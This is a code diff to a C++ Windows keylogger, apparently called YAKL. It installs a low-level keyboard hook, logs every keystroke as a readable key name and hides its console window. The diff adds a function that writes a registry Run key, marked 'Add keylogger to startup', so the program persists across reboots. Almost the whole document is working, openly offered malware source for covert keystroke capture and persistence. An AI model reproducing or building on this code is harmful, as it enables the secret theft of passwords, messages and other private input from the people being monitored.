@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <iostream>
 #include <string>
+#include <tchar.h> // For TCHAR
 #include "logger.h"
 
 Logger logger; // Logger instance
@@ -8,12 +9,10 @@ Logger logger; // Logger instance
 std::string getKeyName(DWORD vkCode) {
     char keyName[128];
 
-    // Check if the key is an alphabet (A-Z)
     if (vkCode >= 'A' && vkCode <= 'Z') {
-        bool isShiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0; // Check Shift state
-        bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0; // Check Caps Lock state
+        bool isShiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+        bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
-        // Determine if the letter should be uppercase or lowercase
         if (isShiftPressed ^ isCapsLockOn) {
             return std::string(1, vkCode); // Uppercase
         } else {
@@ -21,7 +20,6 @@ std::string getKeyName(DWORD vkCode) {
         }
     }
 
-    // Handle special keys (e.g., Enter, Backspace)
     switch (vkCode) {
         case VK_RETURN: return "Enter";
         case VK_BACK: return "Backspace";
@@ -34,7 +32,6 @@ std::string getKeyName(DWORD vkCode) {
         default: break;
     }
 
-    // Get readable name for other keys
     UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
     if (GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName))) {
         return std::string(keyName);
@@ -43,16 +40,14 @@ std::string getKeyName(DWORD vkCode) {
     }
 }
 
-
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT* pKBDllHookStruct = (KBDLLHOOKSTRUCT*)lParam;
         DWORD vkCode = pKBDllHookStruct->vkCode;
 
-        // Log keypress if key is down
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-            std::string keyName = getKeyName(vkCode); // Get readable key name
-            logger.logKey(keyName);                  // Log the key
+            std::string keyName = getKeyName(vkCode);
+            logger.logKey(keyName);
         }
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -65,10 +60,21 @@ void hideConsoleWindow() {
     }
 }
 
-int main() {
-    hideConsoleWindow(); // Hide the console window
+void addToStartup() {
+    HKEY hKey;
+    const char* appName = "YAKL";
+    const char* exePath = "C:\\Path\\To\\YAKL.exe"; // Change to actual executable path
 
-    // Set up the keyboard hook
+    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
+        RegSetValueEx(hKey, appName, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
+        RegCloseKey(hKey);
+    }
+}
+
+int main() {
+    hideConsoleWindow();
+    addToStartup(); // Add keylogger to startup
+
     HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     if (hHook == NULL) {
         std::cerr << "Error: Unable to set up keyboard hook!" << std::endl;
